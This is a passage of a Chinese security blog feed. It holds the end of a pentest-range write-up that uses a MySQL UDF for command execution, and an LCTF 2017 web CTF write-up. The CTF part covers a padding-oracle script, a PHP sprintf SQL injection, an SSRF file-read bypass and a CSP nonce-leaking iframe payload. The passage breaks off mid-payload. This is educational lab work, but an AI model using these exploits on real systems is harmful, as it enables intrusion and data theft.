load_file(&apos;/usr/lib/mysql/plugin/mysqludf.so&apos;) into dumpfile &apos;/usr/lib/mysql/plugin/heartsky.so</span><br></pre></td></tr></table></figure></p><p>但是一直没写入成功，本地试了下，猜测可能是 mysql 权限不足的问题， 于是尝试把用户名改成 root，密码不变再去连接，结果证明 root 用户的密码也是这个<br>加载函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_eval returns string soname &quot;heartsky.so&quot;;</span><br></pre></td></tr></table></figure></p><p>成功执行命令，获取到了数据库服务器的权限<br><img src="http://heartsky.info/images/pockr_weishouqun/20180324002442_WxSr8J_Screenshot.jpeg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;靶场来源: &lt;a href=&quot;https://pockr.org/bug-environment/detail?environment_no=env_a20a1282feaae3fcbc&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://poc
      
    
    </summary>
    
    
      <category term="渗透" scheme="http://heartsky.info/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>LCTF 2017 Web writeup</title>
    <link href="http://heartsky.info/2017/11/21/LCTF-2017-Web-writeup/"/>
    <id>http://heartsky.info/2017/11/21/LCTF-2017-Web-writeup/</id>
    <published>2017-11-21T13:43:19.000Z</published>
    <updated>2018-10-26T06:08:42.431Z</updated>
    
    <content type="html"><![CDATA[<p>这次趁着周末有些时间，做了西电师傅们的 LCTF，整场下来感觉质量可以，没有太大的脑洞。</p><h3 id="Simple-blog"><a href="#Simple-blog" class="headerlink" title="Simple blog"></a>Simple blog</h3><blockquote><p>A simple blog .To discover the secret of it.<br><a href="http://111.231.111.54/" target="_blank" rel="external">http://111.231.111.54/</a></p></blockquote><p>打开后是一个简洁的博客系统，主页面没有什么功能，扫一下发现有 .login.php.swp 和 .admin.php.swp</p><h4 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_page</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">  &lt;meta charset="UTF-8"&gt;</span></span><br><span class="line"><span class="string">  &lt;title&gt;Login Form&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;link rel="stylesheet" type="text/css" href="css/login.css" /&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;div class="login"&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;后台登录&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method="post"&gt;</span></span><br><span class="line"><span class="string">        &lt;input type="text" name="username" placeholder="Username" required="required" /&gt;</span></span><br><span class="line"><span class="string">        &lt;input type="password" name="password" placeholder="Password" required="required" /&gt;</span></span><br><span class="line"><span class="string">        &lt;button type="submit" class="btn btn-primary btn-block btn-large"&gt;Login&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_token</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_token = <span class="string">''</span>;</span><br><span class="line">    $str = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</span><br><span class="line">        $random_token .= substr($str, rand(<span class="number">1</span>, <span class="number">61</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $id;</span><br><span class="line">    $token = get_random_token();</span><br><span class="line">    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</span><br><span class="line">    $_SESSION[<span class="string">'id'</span>] = base64_encode($c);</span><br><span class="line">    setcookie(<span class="string">"token"</span>, base64_encode($token));</span><br><span class="line">    <span class="keyword">if</span>($id === <span class="string">'admin'</span>)&#123;</span><br><span class="line">    $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</span><br><span class="line">        $c = base64_decode($_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        $token = base64_decode($_COOKIE[<span class="string">"token"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</span><br><span class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Error!"</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">$username = mysql_real_escape_string($_POST[<span class="string">'username'</span>]);</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$result = mysql_query(<span class="string">"select password from users where username='"</span> . $username . <span class="string">"'"</span>, $con);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row[<span class="string">'password'</span>] === md5($password))&#123;</span><br><span class="line">  get_identity();</span><br><span class="line">  header(<span class="string">'location: ./admin.php'</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'Login failed.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(test_identity())&#123;</span><br><span class="line">        header(<span class="string">'location: ./admin.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        show_page();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="admin-php"><a href="#admin-php" class="headerlink" title="admin.php"></a>admin.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_SESSION[<span class="string">'isadmin'</span>])&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'You are not admin'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">$id = mysql_real_escape_string($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</span><br><span class="line">$title = mysql_real_escape_string($_GET[<span class="string">'title'</span>]);</span><br><span class="line">$title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$title = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</span><br><span class="line">$result = mysql_query($sql,$con);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'title'</span>])&amp;&amp;<span class="keyword">isset</span>($row[<span class="string">'content'</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$row[<span class="string">'title'</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;"</span>.$row[<span class="string">'content'</span>];</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"This article does not exist."</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;adminpage&lt;/title&gt;</span><br><span class="line">&lt;link href=<span class="string">"css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;nav class="navbar navbar-default" role="navigation"&gt;</span><br><span class="line">   &lt;div class="navbar-header"&gt;</span><br><span class="line">      &lt;a class="navbar-brand" href="#"&gt;后台&lt;/a&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   &lt;div&gt;</span><br><span class="line">      &lt;ul class="nav navbar-nav"&gt;</span><br><span class="line">         &lt;li class="active"&gt;&lt;a href="#"&gt;编辑文章&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li&gt;&lt;a href=<span class="string">"#"</span>&gt;设置&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">   &lt;/div&gt;&lt;/nav&gt;</span><br><span class="line">   &lt;div class="panel panel-success"&gt;</span><br><span class="line">   &lt;div class="panel-heading"&gt;</span><br><span class="line">      &lt;h1 class="panel-title"&gt;文章列表&lt;/h1&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   &lt;div class="panel-body"&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=1'</span>&gt;Welcome to myblog&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=2'</span>&gt;Hello,world!&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=3'</span>&gt;This is admin page&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>之前碰到过很多次 cbc 相关的的攻击了，先 padding oracle attack 得到中间值，再字节反转得到自己想要的值，比如这里是 <code>admin</code>，原理不再叙说，有兴趣的看下这两篇文章，分析的都不错<br><a href="http://www.freebuf.com/articles/web/15504.html" target="_blank" rel="external">我对Padding Oracle攻击的分析和思考（详细）</a><br><a href="http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html" target="_blank" rel="external">Padding Oracle Attack实例分析</a></p><p>因为这里我构造的是一个分组长度的密文，所以第一个字节直接登录爆破(登录成功即构造想要的明文成功)<br>ps: 第一个字节的值也可以通过构造两个分组长度的密文，第二个分组全是 0x10 的形式，利用和得到其他字节一样的 padding error 来得到</p><p>脚本<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://111.231.111.54/login.php'</span></span><br><span class="line">iv = list(<span class="string">'0000000000000000'</span>)</span><br><span class="line">mid = [<span class="string">'0'</span>] * <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到第一个分组密文的中间值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getMiddleValue</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">        iv_fix = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i<span class="number">-1</span>)[::<span class="number">-1</span>]:</span><br><span class="line">            iv_fix += chr(ord(mid[<span class="number">16</span>-j<span class="number">-1</span>]) ^ i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            iv = <span class="string">'0'</span> * (<span class="number">16</span>-i) + chr(j) + iv_fix</span><br><span class="line">            cookies = dict(PHPSESSID=<span class="string">'5vr0tum53p0kfpth39dqirh900'</span>, token=iv.encode(<span class="string">"base64"</span>).replace(<span class="string">'='</span>, <span class="string">'%3D'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>))</span><br><span class="line">            r = requests.get(url, cookies=cookies)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Error!'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="keyword">print</span> iv</span><br><span class="line">                mid[<span class="number">16</span>-i] = chr(i ^ j)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">''</span>.join(mid).encode(<span class="string">'hex'</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 303373782b0e140603135c1407091b66 (hex middle value)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录爆破第一个字节</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span>    </span><br><span class="line">    mid = list(<span class="string">'303373782b0e140603135c1407091b66'</span>.decode(<span class="string">'hex'</span>))</span><br><span class="line">    iv = [<span class="string">'0'</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">16</span>):</span><br><span class="line">            iv[i] = chr(<span class="number">0x0b</span> ^ ord(mid[i]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        iv[i] = chr(ord(<span class="string">'dmin'</span>[i<span class="number">-1</span>]) ^ ord(mid[i]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        iv[<span class="number">0</span>] = chr(i)</span><br><span class="line">        cookies = dict(PHPSESSID=<span class="string">'5vr0tum53p0kfpth39dqirh900'</span>, token=<span class="string">''</span>.join(iv).encode(<span class="string">"base64"</span>).replace(<span class="string">'='</span>, <span class="string">'%3D'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>))</span><br><span class="line">        r = requests.get(url, cookies=cookies, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">print</span> cookies</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    login()</span><br></pre></td></tr></table></figure></p><p>ps2: PHPSESSID 值是 admin 账户弱口令 admin 登录拿到的，否则就会导致无法进入 get_identity 函数，变量 <code>$_SESSION[&#39;id&#39;]</code> 值为空，进入不了解密部分，也就无法实现 cbc 攻击</p><p>利用得到的 token 进入 admin.php，看下源码，很明显是 php sprintf 的格式化字符串漏洞，随便找一篇文章分析下<br><a href="https://paper.seebug.org/386/" target="_blank" rel="external">从WordPress SQLi谈PHP格式化字符串问题（2017.11.01更新）</a></p><p>php 的 sprintf 有下面这种写法<br><img src="http://heartsky.info/images/LCTF/20171120145400_ryBV9G_1.jpeg" alt=""></p><p>% 后面的数字表示第几个参数，$ 后面的字符表示数据的类型，我们看下 php 源码中对于 $ 后面数据类型的处理<br><img src="http://heartsky.info/images/LCTF/20171120145654_0umAeT_2.jpeg" alt=""><br>如果匹配不到上面的类型，默认是 break，不做任何处理，所以如果构造 <code>%1$&#39;</code>，单引号经过转义后成为 <code>%1$\&#39;</code>，然后再经过 sprintf 时 <code>\</code> 被当做数据类型符，因为它不在已知的类型符里，所以跳到了 default，不作任何处理，单引号成功逃逸。</p><p>也可以采用 <code>%&#39;</code> 的形式绕过，因为转义后是 <code>%\&#39;</code>，而 <code>%\</code> 是一个不存在的类型，但是 php 不会报错，而是输出为空，不过这样容易遇到 <code>Warning: sprintf(): Too few arguments</code> 的报错，因为虽然这样写进去了但是后面缺少参数，而上面提到的方式直接输出为空了。</p><p>本地试一下，源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</span><br><span class="line">    $title = addslashes($_GET[<span class="string">'title'</span>]);</span><br><span class="line">    $title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $title = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>问题在于 title 参数在转义后输出到了 sprintf 第一个参数 <code>string $format</code> 中，如果有 <code>%</code> 就会被当做格式，从而导致了上面的问题。</p><p>输入 <code>id=1&amp;title=%1$&#39; or 1=1%23</code>，<code>$title</code> 的值是 <code>AND title=&#39;%1$\&#39; or 1=1#&#39;</code>，没有什么问题，之后再次进入 sprintf，第一个参数的值是 <code>SELECT * FROM article WHERE id=&#39;%s&#39; AND title=&#39;%1$\&#39; or 1=1#&#39;</code>，其中 <code>%1$\</code> 就会发生上面所分析的问题，最终输出 <code>SELECT * FROM article WHERE id=&#39;1&#39; AND title=&#39;&#39; or 1=1#&#39;</code>。</p><p>然后就可以愉快的注入出 flag 了<br>ps3: 比较坑的是 flag 所在的表名是 key，因为 key 在 mysql 中是关键字，所以不能直接 <code>select f14g from key</code>，可以 <code>select f14g from 数据库名.key</code> 或者 <code>select f14g from `key` </code></p><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>出题人题目名字随便起系列…</p><p>可以提交 url，然后会返回请求到的内容，尝试了很多次发现只能请求 www.baidu.com，然后马上就想到了 orange 之前演讲的 ppt</p><p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="external">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!</a></p><p>是 curl(URL请求器) 和 parse_url(URL解析器) 函数的不同导致的，猜测判断 host 是用的 parse_url 函数</p><p>提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site=http://foo@127.0.0.1 @www.baidu.com:80/</span><br></pre></td></tr></table></figure></p><p>返回<br><img src="http://heartsky.info/images/LCTF/20171120153838_XclIYo_3.jpeg" alt=""><br>成功绕过了判断，实现了任意请求网站，这里细心点可以发现请求的是 <code>http://foo@127.0.0.1 @www.baidu.com:80//</code>，所以可以在后面加上 <code>?</code> 或 <code>%23</code> 来绕过这个</p><p>用 file 协议读取本地文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site=file://foo@127.0.0.1 @www.baidu.com:80/etc/passwd?</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">lctf:x:1000:1000::/home/lctf:/bin/sh</span><br></pre></td></tr></table></figure></p><p>稍微猜下，读取 flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site=file://foo@127.0.0.1 @www.baidu.com:80/home/lctf/flag?</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Source Code:&lt;/h1&gt;file://foo@127.0.0.1 @www.baidu.com:80/home/lctf/flag?/&lt;hr /&gt;LCTF&#123;1eTus_q14ndao_B4_387t439hg9342&#125;</span><br></pre></td></tr></table></figure></p><p>当时其实还是不懂为什么在后面加了才能读到，后来试了下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site=file://www.baidu.com/home/lctf/flag?</span><br></pre></td></tr></table></figure></p><p>这样就可以读到，应该是 file 协议的一种特性，因为 <code>www.baidu.com</code> 是不存在的目录，所以还是在根目录下(大概</p><h3 id="wanna-hack-him"><a href="#wanna-hack-him" class="headerlink" title="wanna hack him?"></a>wanna hack him?</h3><p>有 preview.php 和 submit.php<br>preview.php 可以看到自己的 payload 的效果<br>submit.php 是发送给管理员<br>可以看到有 csp<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'nonce-909593a1d3183240d3be316e15628657';"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>提交的内容显示在这里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body data-feedly-mini=&quot;yes&quot;&gt;aaa&lt;p&gt;comment here&lt;/p&gt;</span><br><span class="line">&lt;script nonce=&quot;909593a1d3183240d3be316e15628657&quot;&gt;var test=&apos;test&apos;;&lt;/script&gt;</span><br><span class="line">&lt;p&gt;welcome to comment on admin&apos;s blog&lt;/p&gt;</span><br></pre></td></tr></table></figure></p><p>所以如果我们提交 <code>&lt;iframe src=&#39;http://xxx.xx?</code><br>效果如下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src="http://xxx.xx?&amp;lt;p&amp;gt;comment here&amp;lt;/p&amp;gt;&amp;#10;&amp;lt;script nonce=&amp;quot;909593a1d3183240d3be316e15628657&amp;quot;&amp;gt;var test=" test';&lt;="" script=""&gt;</span><br><span class="line">&amp;lt;p&amp;gt;welcome to comment on admin's blog&amp;lt;/p&amp;gt;</span><br><span class="line">&amp;lt;/html&amp;gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以看到 nonce 值已经被包含在了 src 里，所以这里可以获取到 nonce 值，然后再提交就可以了，可以把 nonce 值输出到一个文件里，再写个脚本一旦检测到新的 nonce 值就提交，还有一种方式是利用 iframe来写入一个自动提交表单，让 bot 自己请求自己的 preview.php 页面</p><p>在看到官方 wp 后，发现题目的 nonce 值是通过 session 值生成的，所以我们可以把 PHPSESSID 和 nonce 值都替换为我们的(当时想着是重写 CSP，发现并不能覆盖设置</p><p><code>Meta http-equiv</code> 属性为 <code>Set-Cookie</code> 时可以设置 cookie，这样就可以覆盖之前的 cookie</p><p>提交如下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Set-Cookie"</span> <span 